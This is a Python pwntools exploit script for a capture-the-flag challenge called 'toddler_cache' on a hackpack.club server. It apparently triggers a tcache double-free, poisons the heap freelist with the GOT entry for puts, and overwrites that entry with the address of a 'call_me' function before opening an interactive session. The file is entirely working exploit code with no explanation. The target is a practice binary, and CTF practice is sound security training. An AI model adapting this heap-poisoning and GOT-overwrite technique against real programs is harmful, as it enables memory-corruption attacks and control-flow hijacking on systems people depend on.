from pwn import *
import sys

#import kmpwn
sys.path.append('/home/vagrant/kmpwn')
from kmpwn import *
#fsb(width, offset, data, padding, roop)

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./toddler_cache"
HOST = "cha.hackpack.club"
PORT = 41703 

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

elf = ELF(FILE_NAME)
addr_callme = elf.symbols["call_me"]
got_puts = elf.got["puts"]
#addr_main = elf.symbols["main"]
#addr_bss = elf.bss()
#addr_dynsym = elf.get_section_by_name('.dynsym').header['sh_addr']
#
#libc = ELF('./')
#libc_binsh = next(libc.search("/bin/sh"))
def n():
	conn.sendlineafter("> > ", "1")

def w(index, data):
	conn.sendlineafter("> > ", "2")
	conn.sendlineafter("> ", str(index))
	conn.sendlineafter("?\n", data)

def f(index):
	conn.sendlineafter("> > ", "3")
	conn.sendlineafter("> ", str(index))


def exploit():
	n()	#0
	f(0)
	f(0)
	w(0,p64(got_puts))
	n() #1
	n() #2 got_puts
	w(2,p64(addr_callme))
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
